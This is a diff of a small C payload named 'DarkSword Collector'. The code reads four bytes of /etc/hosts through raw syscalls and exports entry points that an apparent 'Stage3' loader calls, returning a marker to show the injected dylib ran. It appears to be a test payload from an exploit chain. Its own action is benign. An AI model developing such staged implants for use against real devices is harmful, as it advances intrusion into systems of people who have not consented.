@@ -1,7 +1,7 @@
 /**
- * DarkSword Collector v52 - ZERO static variables
- * Uses return value protocol only, no persistent state
- * Each call reads /etc/hosts first 4 bytes
+ * DarkSword Collector v53 - exports _process (like bootstrap)
+ * Simple file read via raw BSD syscalls
+ * Must export: _process AND _ds_start
  */
 
 static long _svc1(long n, long a) {
@@ -18,16 +18,18 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_read 3
 #define SYS_close 6
 
-/* No static variables - just read /etc/hosts and return first 4 bytes */
-int ds_start(void) {
+/* Entry point - Stage3 calls _process */
+void _process(void) {
+    /* Read /etc/hosts first 4 bytes and store in a known location */
     long fd = _svc1(SYS_open, (long)"/etc/hosts");
-    if (fd < 0) return 0xFE000000;
-    
+    if (fd < 0) return;
     char buf[4] = {0};
-    long n = _svc3(SYS_read, fd, (long)buf, 4);
+    _svc3(SYS_read, fd, (long)buf, 4);
     _svc1(SYS_close, fd);
-    
-    if (n <= 0) return 0xEE000000;
-    
-    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
+}
+
+/* Also export _ds_start for compatibility */
+int _ds_start(void) {
+    _process();
+    return 0x56781234; /* marker: dylib executed successfully */
 }
